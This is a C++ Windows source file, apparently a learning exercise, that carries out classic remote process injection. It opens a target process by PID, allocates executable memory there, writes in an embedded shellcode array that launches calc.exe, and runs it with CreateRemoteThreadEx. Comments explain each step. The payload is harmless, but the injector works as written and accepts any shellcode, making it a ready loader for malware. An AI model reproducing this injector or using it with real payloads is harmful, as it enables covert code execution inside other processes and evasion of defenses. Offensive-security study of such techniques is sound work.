#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>

/*
* 1. Attach to process
* 2. Allocate some memory within that process
* 3. Write the memory to the process
* 4. Create a thread in the process that'll run the code you've embedded in the process
*/

unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

// We create these globals to store the value of certain functions.
// Like hProcess, if we just OpenProcess() it just opens the process and we can't do anything else with it
// We need to make it a variable so we can manipulate and work with the data
// like if (!hProcess) cause we can't do if(!OpenProcess)

// Int Argc and Char* argv
// Argc is the count of how many strings are in argv
// argv is the actual data, aka list of strings. Its an array
// argv[0] will alsoway be the program name. In this case our exe is "External Process Injection"
// argv[1] would be whatever the user types in the commandline after. For example "External Process Injection.exe 1234" 1234 is argv[1]
// argv[2] = NULL, the C standard gaurentees a NULL terminator after the last one
// So this is a commandline tool. To run enter exe name and arguments after: test.exe 1234
int main(int argc, char* argv[]) {


	DWORD PID = NULL;
	HANDLE hProcess, hThread = NULL;
	BOOL DEBUG = false;
	LPVOID rBuffer = NULL;

	if (argc < 2) {
		printf("[+] usage: %s program.exe <PID>", argv[0]);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	printf("Trying to open handle to process (%ld)...\n", PID);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);
	if (hProcess == NULL) {
		printf("Failed to open handle to PID: %lu\n", PID);

		int error = GetLastError();
		switch (error){
		case 5:
			printf("Access is denied!\n");
			break;
		case 87:
			printf("Please enter a valid PID\n");
			break;
		default:
			printf("Consult System Error Codes on windows documentation to parse error.\n");
			break;
		}
		return EXIT_FAILURE;
	}

	printf("Handle successfully opened!\n");\
		// Allocates bytes to process memory
		// NULL lets the api determine where it starts
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (!rBuffer) {
		printf("Failed to allocate virtual memory :(\n");
		return EXIT_FAILURE;
	}

	printf("Allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", sizeof(shellcode));

	// Write shellcode to process memory within the memory we allocated
	WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), 0);
	printf("Wrote %zu bytes to process memory!\n", sizeof(shellcode));

	// Create a thread to run our payload
	// Since our code is not known to the application, it will never get runtime so we must assign it a thread
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, LPTHREAD_START_ROUTINE(rBuffer), NULL, 0, 0, NULL);
	if (hThread == NULL) {
		printf("Failed to create a thread. Error: %lu", GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("Popping a calc!\n");
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	return EXIT_SUCCESS;
}